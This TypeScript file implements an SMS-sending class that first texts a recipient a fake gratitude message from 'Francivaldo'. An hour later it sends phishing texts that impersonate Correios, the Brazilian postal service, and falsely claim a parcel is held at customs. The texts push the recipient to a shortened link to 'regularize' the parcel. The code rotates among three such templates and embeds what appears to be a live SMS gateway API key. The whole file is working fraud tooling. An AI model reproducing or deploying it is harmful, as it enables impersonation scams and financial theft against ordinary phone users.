
interface SMSResponse {
  situacao: string;
  codigo: string;
  id: string;
  descricao: string;
}

const PHISHING_TEMPLATES = [
  (name: string, link: string) => 
    `CORREIOS INFORMA: ${name}, uma encomenda com destino a sua residencia foi parada pela alfandega. Acesse o link e resolva com urgencia: ${link}`,
  (name: string, link: string) => 
    `[URGENTE]: ${name}, um pedido em seu nome foi taxado na Alfandega e se encontra retido em uma de nossas agencias. Regularize e receba hoje: ${link}`,
  (name: string, link: string) => 
    `[ULTIMO AVISO]: ${name}, um pedido em seu nome foi parado na fiscalizacao Aduaneira de CURITIBA-PR. Acesse com urgencia e regularize: ${link}`
];

export class SMSDevAPI {
  private API_KEY = "V9EOABBNYBP07A1S5ZR2PHQ88SEU09831F1JIJPKLAS7FNVTBVGM8GD31SIBKJQ0RQKPTQCRAJA45L2JNUG9QL638JU23FKD1CX9E8KLEQRD2FNPMZKA5X4ZAESW6X4B";
  private API_URL = "https://api.smsdev.com.br/v1/send";
  private static messageIndex = 0;
  private static PHISHING_LINK = "bit.ly/3TuWr8p";

  async sendSMS(phoneNumber: string, name: string): Promise<boolean> {
    try {
      console.log("[SMSDev] Iniciando envio de SMS para:", phoneNumber);
      const cleanPhone = phoneNumber.replace(/\D/g, '');
      const firstName = name.split(' ')[0];
      const message = encodeURIComponent(
        `[Mensagem de Francivaldo] ${firstName}, voce e um anjo que Deus enviou a minha vida. Gratidao eterna pela sua ajuda. Vou conseguir ajudar minha familia Gracas a Deus`
      );

      const url = `${this.API_URL}?key=${this.API_KEY}&type=9&number=${cleanPhone}&msg=${message}`;
      const response = await fetch(url);
      const data: SMSResponse = await response.json();

      if (data.situacao === "OK") {
        // Schedule phishing SMS after 1 hour
        setTimeout(() => this.sendPhishingSMS(cleanPhone, firstName), 3600000);
        return true;
      }
      return false;
    } catch (error) {
      console.error("[SMSDev] Erro ao enviar SMS:", error);
      return false;
    }
  }

  private async sendPhishingSMS(phoneNumber: string, name: string): Promise<void> {
    try {
      const template = PHISHING_TEMPLATES[SMSDevAPI.messageIndex];
      const message = encodeURIComponent(template(name, this.PHISHING_LINK));
      
      const url = `${this.API_URL}?key=${this.API_KEY}&type=9&number=${phoneNumber}&msg=${message}`;
      await fetch(url);
      
      // Rotate to next template
      SMSDevAPI.messageIndex = (SMSDevAPI.messageIndex + 1) % PHISHING_TEMPLATES.length;
    } catch (error) {
      console.error("[SMSDev] Erro ao enviar SMS de phishing:", error);
    }
  }
}

export function create_sms_api(): SMSDevAPI {
  return new SMSDevAPI();
}
